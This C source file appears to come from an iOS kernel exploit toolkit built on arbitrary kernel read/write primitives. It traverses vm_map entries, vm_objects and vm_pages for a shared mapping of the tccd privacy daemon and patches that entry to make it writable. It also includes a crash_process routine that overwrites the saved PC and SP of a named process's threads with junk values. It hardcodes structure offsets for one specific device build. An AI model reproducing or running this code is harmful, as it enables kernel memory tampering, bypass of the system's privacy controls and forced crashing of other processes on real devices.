#include "helpers.h"
#include "vm_page.h"

#pragma MARK - vm_map_entry_print


void vm_page_init_log(void)
{
    
    printf("[*] vm_page_array_beginning_addr : 0x%llx \n",vm_page_array_beginning_addr );
    printf("[*] vm_page_array_ending_addr : 0x%llx \n",vm_page_array_ending_addr );
//    printf("[*] vm_first_phys_ppnum : 0x%llx \n",vm_first_phys_ppnum );
    printf("[*] vm_pages_count : 0x%llx \n",vm_pages_count );
    
    

    printf("[*] (vm_page_array_ending_addr - vm_page_array_beginning_addr) / vm_page_size : 0x%llx \n",(vm_page_array_ending_addr - vm_page_array_beginning_addr) / struct_vm_page_size );
    
    uint32_t vm_page_0[struct_vm_page_size];
    kread(vm_page_array_beginning_addr, &vm_page_0, struct_vm_page_size);
    for (int i = 0; i < struct_vm_page_size; i += 4) {
        uint32_t val = *(uint32_t *)(vm_page_0 + i);
        // 打印：偏移量 | 32位数值(十六进制)
        printf("[*] vm_page_0:    0x%02x | 0x%08x\n", i, val);
    }
    
    uint32_t vm_page_1[struct_vm_page_size];
    kread(vm_page_array_beginning_addr + struct_vm_page_size, &vm_page_1, struct_vm_page_size);
    for (int i = 0; i < struct_vm_page_size; i += 4) {
        uint32_t val = *(uint32_t *)(vm_page_1 + i);
        // 打印：偏移量 | 32位数值(十六进制)
        printf("[*] vm_page_1:    0x%02x | 0x%08x\n", i, val);
    }
    
    
    uint32_t vm_page_2[struct_vm_page_size];
    kread(vm_page_array_beginning_addr + struct_vm_page_size + struct_vm_page_size, &vm_page_2, struct_vm_page_size);
    for (int i = 0; i < struct_vm_page_size; i += 4) {
        uint32_t val = *(uint32_t *)(vm_page_2 + i);
        // 打印：偏移量 | 32位数值(十六进制)
        printf("[*] vm_page_2:    0x%02x | 0x%08x\n", i, val);
    }
}

struct vm_page vm_page_print(uint64_t page_kaddr)
{
    struct vm_page page = {0};
    if (page_kaddr == 0) return page;

    kread(page_kaddr, &page, sizeof(page));
    
    printf("    [Page 0x%llx] vmp_cs_validated:%s(0x%x) vmp_cs_tainted:0x%x vmp_wpmapped:0x%x page.vmp_listq.next:0x%x vmp_offset:0x%x\n",
           page_kaddr,
           (page.vmp_cs_validated == 0xf ? "OK" : "NO"),
           page.vmp_cs_validated,
           page.vmp_cs_tainted,
           page.vmp_wpmapped,
           (uint32_t)page.vmp_listq.next,
           page.vmp_offset);
    
    return page;
}

void vm_object_print(uint64_t unpack_object_kaddr, int depth)
{
    // 防止递归过深
    if (depth > 5 || unpack_object_kaddr == 0) return;

    struct vm_object object = {0};
    kread(unpack_object_kaddr, &object, sizeof(object));
    
    // 打印 Object 基础信息
    char indent[16] = {0};
    for(int i=0; i<depth; i++) strcat(indent, "  ");

    printf("%s[*] Object [0x%llx]: Resident:0x%x Shadow:0x%p Copy:0x%p Size:0x%llx\n",
           indent,
           unpack_object_kaddr,
           object.resident_page_count,
           object.shadow,
           object.vo_copy,
           object.vo_un1.vou_size);

    // 1. 遍历驻留页面 (Resident Pages)
    if (object.resident_page_count > 0)
    {
        printf("%s  [Resident Pages List]:\n", indent);
        
        // 注意：memq.next 在 arm64e 上通常是 packed (32bit)
        uint32_t first_packed_page = (uint32_t)(uintptr_t)object.memq.next;
        uint64_t page_kaddr = vm_page_unpack_ptr(first_packed_page);
        
        uint32_t pages_found = 0;
        // 循环终止条件：回到 Object 头 (unpack_object_kaddr) 或达到预期计数
        while (page_kaddr != 0 &&
               page_kaddr != unpack_object_kaddr &&
               pages_found < (object.resident_page_count + 10))
        {
            struct vm_page p = vm_page_print(page_kaddr);
            pages_found++;
            
            // 解压下一页地址
            uint32_t next_packed = (uint32_t)p.vmp_listq.next;
            page_kaddr = vm_page_unpack_ptr(next_packed);
        }
    }
    
    // 2. 递归处理 Shadow Object (父对象)
    // 注意：在 arm64e 结构体中，虽然定义是指针，但内存里可能是 32 位 packed 值
    uint32_t packed_shadow = (uint32_t)(uintptr_t)object.shadow;
    if (packed_shadow != 0)
    {
        printf("%s  [Shadow Chain] ->\n", indent);
        uint64_t shadow_kaddr = vm_page_unpack_ptr(packed_shadow);
        vm_object_print(shadow_kaddr, depth + 1);
    }
    
    // 3. 递归处理 vo_copy (仅当确实需要追踪拷贝链时)
    uint32_t packed_copy = (uint32_t)(uintptr_t)object.vo_copy;
    if (packed_copy != 0)
    {
        printf("%s  [Copy Object] ->\n", indent);
        uint64_t copy_kaddr = vm_page_unpack_ptr(packed_copy);
        // 为了防止输出爆炸，vo_copy 建议只打一层或不递归
        // vm_object_print(copy_kaddr, depth + 1);
    }
}

void vm_map_entry_print(uint64_t entry_addr)
{
    if (entry_addr == 0) return;

    struct vm_map_entry entry = {0};
    kread(entry_addr, &entry, sizeof(entry));
    
    printf("\n[***] VM_MAP_ENTRY: 0x%llx\n", entry_addr);
    printf("      Range: 0x%llx - 0x%llx\n", entry.links.start, entry.links.end);
    printf("      Prot: 0x%x/0x%x Submap:%d KernelObj:%d\n",
           (uint32_t)entry.protection, (uint32_t)entry.max_protection,
           (uint32_t)entry.is_sub_map, (uint32_t)entry.vme_kernel_object);
    
    // 获取 Packed Object 指针
    uint32_t object_packed = (uint32_t)entry.vme_object_or_delta;
    
    if (!entry.is_sub_map && object_packed != 0)
    {
        uint64_t unpack_object_kaddr = vm_page_unpack_ptr(object_packed);
        printf("      Object(Packed): 0x%x -> Unpacked: 0x%llx\n", object_packed, unpack_object_kaddr);
        
        // 开始递归打印对象树
        vm_object_print(unpack_object_kaddr, 0);
    }
    else if (entry.is_sub_map)
    {
        printf("      [Submap Entry] - Object address represents a vm_map\n");
    }
}

bool vm_map_entry_print1(void)
{
    
    assert(vm_page_array_beginning_addr != 0);
    
    
    char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);

    off_t targetLength = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
   
    uint64_t vm_map = task_get_vm_map( task_self());
    
    uint64_t entry_addr = find_vm_map_entry(vm_map, targetMap);
    
    if (1)
    {
        struct vm_map_entry entry = {0};
        kread(entry_addr, &entry, sizeof(entry));
        printf("\n[*]    entry_addr 0x%llx \n",entry_addr);
        printf("[*]    entry.links.prev : 0x%llx \n",entry.links.prev);
        printf("[*]    entry.links.next : 0x%llx \n",entry.links.next);
        printf("[*]    entry.links.start : 0x%llx \n",entry.links.start);
        printf("[*]    entry.links.end : 0x%llx \n",entry.links.end);
        printf("[*]    entry.used_for_jit : 0x%llx \n",entry.used_for_jit);
        printf("[*]    entry.protection : 0x%llx \n",entry.protection);
        printf("[*]    entry.max_protection : 0x%llx \n",entry.max_protection);
        printf("[*]    entry.is_sub_map : 0x%llx \n",entry.is_sub_map);
        printf("[*]    entry.vme_kernel_object : 0x%llx \n",entry.vme_kernel_object);
        printf("[*]    entry.vme_object : 0x%llx \n",entry.vme_object_or_delta);

        
        uint8_t *byte_ptr = (uint8_t *)&entry;
        for (int i = 0; i < sizeof(entry); i += 4) {
            uint32_t val = *(const uint32_t *)(byte_ptr + i);
            // 打印：偏移量 | 32位数值(十六进制)
            printf("[*] entry:    0x%02x | 0x%08x\n", i, val);
        }
    
        
#define VM_PAGE_PACKED_FROM_ARRAY       0x80000000

        // read vm_object
        uint64_t object_kaddr = entry.vme_object_or_delta;
        if (!entry.is_sub_map) {
            
            uint64_t unpack_object_kaddr = vm_page_unpack_ptr(object_kaddr);
            printf("[*]  object_kaddr: 0x%llx  unpacked_object_kaddr : 0x%llx \n",object_kaddr,unpack_object_kaddr);
//            printf("[*]  object_kaddr: 0x%llx  unpacked_object_kaddr 2 : 0x%llx \n",object_kaddr,vm_page_unpack_ptr_fix(object_kaddr));
            
            
            struct vm_object object = {0};
            kread(unpack_object_kaddr, &object, sizeof(object));
            
            if (1)
            {
                printf("[*]  object.resident_page_count: 0x%llx \n",object.resident_page_count);
                printf("[*]  object.memq.next: 0x%llx \n",object.memq.next);
                printf("[*]  object.memq.prev: 0x%llx \n",object.memq.prev);
                printf("[*]  object.vo_un1.vou_size: 0x%llx \n",object.vo_un1.vou_size);
                printf("[*]  object.vo_copy_version: 0x%llx \n",object.vo_copy_version);
                printf("[*]  object.shadow: 0x%llx \n",object.shadow);
                
            }
            
            if (object.resident_page_count)
            {
                uint64_t page_kaddr = vm_page_unpack_ptr(object.memq.next);
                
                while (page_kaddr != unpack_object_kaddr) {
                    struct vm_page page = {};
                    kread(page_kaddr, &page, sizeof(page));
                    
                    if(1)
                    {
                        printf("[*]  page addr : 0x%llx \n",page_kaddr);
                        printf("[*]  page.vmp_cs_validated : 0x%llx \n",page.vmp_cs_validated);
                        printf("[*]  page.vmp_cs_tainted : 0x%llx \n",page.vmp_cs_tainted);
                        printf("[*]  page.vmp_wpmapped : 0x%llx \n",page.vmp_wpmapped);
                        printf("[*]  page.vmp_listq.next : 0x%llx \n",page.vmp_listq.next);
                        printf("[*]  page.vmp_wire_count : 0x%llx \n",page.vmp_wire_count);
                        printf("[*]  page.vmp_local_id : 0x%llx \n",page.vmp_local_id);
                    }
                    
                    page_kaddr = vm_page_unpack_ptr(page.vmp_listq.next);
                }
                
            }
        }


    }
    
    
    return false;
}

void vm_map_entry_print2(void)
{
    
    assert(vm_page_array_beginning_addr != 0);
    
    
    char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);

    off_t targetLength = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
    
//    NSData * originData = [[NSData alloc] initWithBytes:targetMap length:targetLength];
//    originData = [originData mutableCopy];
    
    printf("[*] tccd targetMap:  0x%llx targetLength: 0x%llx \n ",targetMap,targetLength);
   
    uint64_t vm_map = task_get_vm_map( task_self());
    
    uint64_t entry_addr = find_vm_map_entry(vm_map, targetMap);
    
    // sizeof(struct vm_map_entry) == 80 check for 22G100__iPhone16,1
    _Static_assert(sizeof(struct vm_map_entry) == 80, "vm_map_entry size must be 80 bytes");
    
//    patch_entry_prot_standard(entry_addr, VM_PROT_READ | VM_PROT_WRITE);
    patch_vm_map_entry_to_rw_zone_element(entry_addr);
    
    uint64_t f1 = kread64(entry_addr + 0x48);
    printf("[*] MAP_SHARED vm_map_entry offset 0x48 : 0x%llx  \n",f1);
    
}

void vm_map_entry_print3(void)
{
    
    assert(vm_page_array_beginning_addr != 0);
    
    
    char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);

    off_t targetLength = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_PRIVATE, fd, 0);
    
//    NSData * originData = [[NSData alloc] initWithBytes:targetMap length:targetLength];
//    originData = [originData mutableCopy];
    
    printf("[*] tccd targetMap:  0x%llx targetLength: 0x%llx \n ",targetMap,targetLength);
   
    uint64_t vm_map = task_get_vm_map( task_self());
    
    uint64_t entry_addr = find_vm_map_entry(vm_map, targetMap);
    
    // sizeof(struct vm_map_entry) == 80 check for 22G100__iPhone16,1
    _Static_assert(sizeof(struct vm_map_entry) == 80, "vm_map_entry size must be 80 bytes");
    
    // make it rw
//    struct vm_map_entry entry_cont = {0};
//    kread(entry_addr, &entry_cont, sizeof(entry_cont));
//    entry_cont.used_for_jit = 1;
//    entry_cont.protection = VM_PROT_READ | VM_PROT_WRITE;
//    entry_cont.max_protection = VM_PROT_READ | VM_PROT_WRITE;
//    kwritebuf(entry_addr, &entry_cont, sizeof(entry_cont));


//    vm_map_entry_print(entry_addr);
    
    
    uint64_t f1 = kread64(entry_addr + 0x48);
    printf("[*] MAP_PRIVATE vm_map_entry offset 0x48 : 0x%llx  \n",f1);

    
    
}




#define off_task_threads             0x50
#define off_thread_task_threads      0x3E8
#define off_thread_thread_id         0x4A8
#define off_thread_ctid              0x4B0
#define off_thread_ctsid             0x4B4
#define off_thread_last_run_time     0x250

#define off_thread_machine_base        0x4D8
#define off_thread_machine_contextData 0x4E8  // <- 替代 upcb，它是同一地址的原始裸指针
#define off_thread_machine_upcb        0x4F0  // 带有 PAC 签名的指针
#define off_thread_machine_uNeon       0x4F8
#define off_thread_machine_kpcb        0x500


#define off_thread_mach_exc_info     0x360
#define off_thread_os_reason         0x360
#define off_thread_exception_type    0x364
#define off_thread_exception_code    0x368
#define off_thread_exception_subcode 0x370
#define off_thread_user_stop_count   0x378

int crash_process(const char* name) {
   uint64_t proc = proc_find_by_name(name);
   if (!proc) return -1;
   
   uint64_t task = proc_task(proc);
   if (!is_kaddr_valid(task)) return -1;
   
   uint64_t queue_head = task + off_task_threads;
   uint64_t curr_link = kread64(queue_head);
   int thread_count_total = kread32(task + 0x78);
   
   printf("[*] Found process %s | proc: 0x%llx | task: 0x%llx   thread_count:0x%x \n", name, proc, task, thread_count_total);

   int thread_count = 0;
   int corrupted_count = 0;
   
   while (curr_link != 0 && curr_link != queue_head) {
       if (!is_kaddr_valid(curr_link)) {
           printf("[-] Corrupted queue_chain pointer. Aborting.\n");
           break;
       }
       
       uint64_t thread = curr_link - off_thread_task_threads;
       
       uint64_t thread_id     = kread64(thread + off_thread_thread_id);
       uint32_t ctid          = kread32(thread + off_thread_ctid);
       uint32_t ctsid         = kread32(thread + off_thread_ctsid);
       uint64_t last_run_time = kread64(thread + off_thread_last_run_time);
       
       uint64_t upcb_pac = kread64(thread + off_thread_machine_upcb);
       uint64_t upcb_raw = kread64(thread + off_thread_machine_contextData);
       
       printf("[*] thread_id: 0x%llx | ctid: 0x%x | ctsid: 0x%x | last_run_time: 0x%llx\n",
              thread_id, ctid, ctsid, last_run_time);
       printf("[*] upcb(PAC): 0x%llx | upcb(RAW): 0x%llx\n", upcb_pac, upcb_raw);

       if (is_kaddr_valid(upcb_raw)) {
           printf("[+] thread upcb arm_saved_state khexdump:\n");
           khexdump(upcb_raw, 0x130);
           
           uint64_t state = upcb_raw + off_arm_saved_state_uss_ss_64;
           kwrite64(state + offsetof(struct arm_saved_state64, pc), 0x1337133713371337);
           kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
           
           
           
       }
       
       kwrite32(thread + off_thread_os_reason, 1);
       
       printf("[+] thread mach_exc_info khexdump:\n");
       khexdump(thread + off_thread_os_reason, 0x18);
       

       curr_link = kread64(curr_link);
       thread_count++;
       
       if (thread_count >= thread_count_total) break;
   }
   
   printf("[*] Done. Iterated %d threads, corrupted %d UPCBs.\n", thread_count, corrupted_count);
   return 0;
}

